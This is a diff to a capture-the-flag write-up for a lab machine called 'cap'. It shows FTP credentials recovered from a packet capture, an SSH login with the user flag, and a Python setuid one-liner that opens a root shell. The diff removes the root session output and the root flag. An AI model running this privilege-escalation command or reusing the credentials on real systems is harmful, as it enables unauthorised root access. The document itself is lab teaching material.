@@ -57,6 +57,7 @@ Credentials: Nathan : Buck3tH4TF0RM3!
 
 This Pcap file has username and password for FTP service. Let’s use these credentials to login via SSH and read the user flag.
 
+```
 nathan@cap:~$ ls -la
 total 28
 drwxr-xr-x 3 nathan nathan 4096 May 27  2021 .
@@ -70,7 +71,7 @@ lrwxrwxrwx 1 root   root      9 May 27  2021 .viminfo -> /dev/null
 -r-------- 1 nathan nathan   33 Mar  8 23:49 user.txt
 nathan@cap:~$ cat user.txt
 ***ce3f90fe646c14a033f2cff997f3b5c4***
-
+```
 # Privilege Escalation
 
 Let’s run LinPeas to find any escalation paths.
@@ -87,31 +88,9 @@ Exec the suid exp command:
 
 **python -c 'import os; os.setuid(0); os.system("/bin/sh")'**
 
-```
-nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
-# whoami
-root
-# cd /root/
-# ls -la
-total 36
-drwx------  6 root root 4096 Mar  8 23:49 .
-drwxr-xr-x 20 root root 4096 Jun  1  2021 ..
-lrwxrwxrwx  1 root root    9 May 15  2021 .bash_history -> /dev/null
--rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-drwxr-xr-x  3 root root 4096 May 23  2021 .cache
-drwxr-xr-x  3 root root 4096 May 23  2021 .local
--rw-r--r--  1 root root  161 Dec  5  2019 .profile
-drwx------  2 root root 4096 May 23  2021 .ssh
-lrwxrwxrwx  1 root root    9 May 27  2021 .viminfo -> /dev/null
--r--------  1 root root   33 Mar  8 23:49 root.txt
-drwxr-xr-x  3 root root 4096 May 23  2021 snap
-# cat root.txt
-1d96b9552d8caefcd6e857075c0cc138
-```
-
 <img width="758" height="365" alt="flag2" src="https://github.com/user-attachments/assets/9817b37b-e5a9-46cb-80f4-8671c0475b85" />
 
-
+**We got access to root shell and read the root flag.**
 
 
 
